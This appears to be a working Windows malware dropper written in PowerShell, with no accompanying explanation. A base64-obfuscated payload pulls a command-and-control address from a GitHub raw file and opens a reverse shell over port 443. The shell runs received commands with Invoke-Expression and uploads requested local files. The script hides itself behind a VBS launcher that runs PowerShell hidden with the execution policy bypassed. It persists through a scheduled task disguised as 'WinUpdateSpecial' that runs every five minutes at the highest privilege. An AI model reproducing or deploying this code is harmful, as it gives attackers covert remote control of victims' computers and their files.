$code = @'

$encodedScript = "JGNzaGFycENvZGUgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9uczsNCg0KcHVibGljIGNsYXNzIFdlYkNvbnRlbnRHZXR0ZXINCnsNCiAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXRNb2RpZmllZENvbnRlbnQoKQ0KICAgIHsNCiAgICAgICAgc3RyaW5nIHVybCA9ICJodHRwczovL2dpdGh1Yi5jb20vUmFkbWV4L21haW4vcmF3L3JlZnMvaGVhZHMvbWFpbi9yb20udHh0IjsNCiAgICAgICAgDQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICBIdHRwV2ViUmVxdWVzdCByZXF1ZXN0ID0gKEh0dHBXZWJSZXF1ZXN0KVdlYlJlcXVlc3QuQ3JlYXRlKHVybCk7DQogICAgICAgICAgICByZXF1ZXN0LlVzZXJBZ2VudCA9ICJNb3ppbGxhLzUuMCI7DQoNCiAgICAgICAgICAgIHVzaW5nIChIdHRwV2ViUmVzcG9uc2UgcmVzcG9uc2UgPSAoSHR0cFdlYlJlc3BvbnNlKXJlcXVlc3QuR2V0UmVzcG9uc2UoKSkNCiAgICAgICAgICAgIHVzaW5nIChTdHJlYW0gc3RyZWFtID0gcmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSkNCiAgICAgICAgICAgIHVzaW5nIChTdHJlYW1SZWFkZXIgcmVhZGVyID0gbmV3IFN0cmVhbVJlYWRlcihzdHJlYW0pKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZyBjb250ZW50ID0gcmVhZGVyLlJlYWRUb0VuZCgpOw0KICAgICAgICAgICAgICAgIGNvbnRlbnQgPSBjb250ZW50LlJlcGxhY2UoIlkiLCAiLiIpOw0KICAgICAgICAgICAgICAgIGNvbnRlbnQgPSBSZWdleC5SZXBsYWNlKGNvbnRlbnQsIEAiXHMrIiwgIiIpOw0KICAgICAgICAgICAgICAgIHJldHVybiBjb250ZW50Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoDQogICAgICAgIHsNCiAgICAgICAgICAgIHJldHVybiBudWxsOyANCiAgICAgICAgfQ0KICAgIH0NCn0NCiJADQoNCiMgQ29tcGlsZSBhbmQgcnVuIGluIG1lbW9yeQ0KQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uICRjc2hhcnBDb2RlIC1MYW5ndWFnZSBDU2hhcnANCg0KIyBDYWxsIHRoZSBtZXRob2QgYW5kIG91dHB1dCB0aGUgcmVzdWx0DQokcmVzdWx0ID0gW1dlYkNvbnRlbnRHZXR0ZXJdOjpHZXRNb2RpZmllZENvbnRlbnQoKQ0KDQppZiAoJHJlc3VsdCAtbmUgJG51bGwpIHsNCiAgICN5bw0KfSBlbHNlIHsNCiAgICBXcml0ZS1PdXRwdXQgIkZhaWxlZCB0byBkb3dubG9hZCBvciBwcm9jZXNzIHRoZSBVUkwuIg0KICAgIGV4aXQgMQ0KfQ0KDQp3aGlsZSAoJHRydWUpIHsNCiAgICB0cnkgew0KICAgICAgICAkeERWbEN2b01kSGdwWCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgkcmVzdWx0LCA0NDMpDQogICAgICAgIGlmICgkeERWbEN2b01kSGdwWC5Db25uZWN0ZWQpIHsNCiAgICAgICAgICAgICRWckg1UXVkMExqQXRvaDY3QSA9ICR4RFZsQ3ZvTWRIZ3BYLkdldFN0cmVhbSgpDQogICAgICAgICAgICAkd2ZBYTdJeThIWk9VbCA9IFtEYXRlVGltZV06Ok5vdw0KDQogICAgICAgICAgICB3aGlsZSAoJHhEVmxDdm9NZEhncFguQ29ubmVjdGVkKSB7DQogICAgICAgICAgICAgICAgW2J5dGVbXV0kNkpxWHdQRzVSNGZjdm5DZ1dTID0gMC4uNjU1MzUgfCBGb3JFYWNoLU9iamVjdCB7IDAgfSAgDQogICAgICAgICAgICAgICAgJEVkelIgPSAkVnJINVF1ZDBMakF0b2g2N0EuUmVhZCgkNkpxWHdQRzVSNGZjdm5DZ1dTLCAwLCAkNkpxWHdQRzVSNGZjdm5DZ1dTLkxlbmd0aCkgICANCg0KICAgICAgICAgICAgICAgIGlmICgkRWR6UiAtZ3QgMCkgew0KICAgICAgICAgICAgICAgICAgICAkd2ZBYTdJeThIWk9VbCA9IFtEYXRlVGltZV06Ok5vdyAgDQogICAgICAgICAgICAgICAgICAgICREdlZZRG9NV2t4aXZWbVkgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoJDZKcVh3UEc1UjRmY3ZuQ2dXUywgMCwgJEVkelIpICANCg0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgaWYgKCREdlZZRG9NV2t4aXZWbVkgLW1hdGNoICJeZG93bmxvYWRccysoLispIikgew0KICAgICAgICAgICAgICAgICAgICAgICAgJDVnWXBaSElXT2pENGsgPSAkeEk1a3JbMV0NCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChUZXN0LVBhdGggJDVnWXBaSElXT2pENGsgLVBhdGhUeXBlIExlYWYpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU3huQWJ2NTFuR0E0dyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkNWdZcFpISVdPakQ0aykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVnJINVF1ZDBMakF0b2g2N0EuV3JpdGUoJFN4bkFidjUxbkdBNHcsIDAsICRTeG5BYnY1MW5HQTR3Lkxlbmd0aCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVnJINVF1ZDBMakF0b2g2N0EuRmx1c2goKQ0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVnJINVF1ZDBMakF0b2g2N0EuV3JpdGUoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoIkZpbGUgbm90IGZvdW5kLiIpLCAwLCAxNCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVnJINVF1ZDBMakF0b2g2N0EuRmx1c2goKQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgJFhDa1ZmN053OHliQmNqMkQzbnZBMUhJID0gSW52b2tlLUV4cHJlc3Npb24gIi4geyAkRHZWWURvTVdreGl2Vm1ZIH0gMj4mMSIgfCBPdXQtU3RyaW5nICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgJEF1T1QgPSAkWENrVmY3Tnc4eWJCY2oyRDNudkExSEkgKyAnUFMgJyArIChHZXQtTG9jYXRpb24pLlBhdGggKyAnPiAnICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAkdURaNDVJdHpVRFYgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkQXVPVCkgICANCiAgICAgICAgICAgICAgICAgICAgICAgICRWckg1UXVkMExqQXRvaDY3QS5Xcml0ZSgkdURaNDVJdHpVRFYsIDAsICR1RFo0NUl0elVEVi5MZW5ndGgpICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICRWckg1UXVkMExqQXRvaDY3QS5GbHVzaCgpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgICRCazhlNW8gPSBbRGF0ZVRpbWVdOjpOb3cgLSAkd2ZBYTdJeThIWk9VbA0KICAgICAgICAgICAgICAgIGlmICgkQms4ZTVvLlRvdGFsTWludXRlcyAtZ2UgMikgew0KICAgICAgICAgICAgICAgICAgICAkeERWbEN2b01kSGdwWC5DbG9zZSgpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrICANCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICR4RFZsQ3ZvTWRIZ3BYLkNsb3NlKCkgIA0KICAgICAgICB9DQogICAgfSBjYXRjaCB7DQogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDEwICANCiAgICB9DQp9"


$encodedScript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedScript))
Invoke-Expression $encodedScript

'@


$programsFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)

$scriptPath = Join-Path $programsFolder "Microsoft\Windows\Templates\script.ps1"


$code | Out-File -FilePath $scriptPath -Encoding ascii


$startupFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)


$batchScriptPath = Join-Path $startupFolder "Microsoft\Windows\Templates\run.vbs"
$batchCode = @"
' Create a Shell object
Set objShell = CreateObject("WScript.Shell")


WScript.Sleep 5000

' Path to the PowerShell script comons
scriptPath = "$scriptPath"


' Command to run PowerShell script in hidden mode
command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & scriptPath & """"

' Execute the command and capture return value
returnValue = objShell.Run(command, 0, True)
"@
$batchCode | Out-File -FilePath $batchScriptPath -Encoding ascii


schtasks /Create /SC minute /MO 5 /TN "WinUpdateSpecial" /TR "wscript.exe '$batchScriptPath'" /F /RL HIGHEST





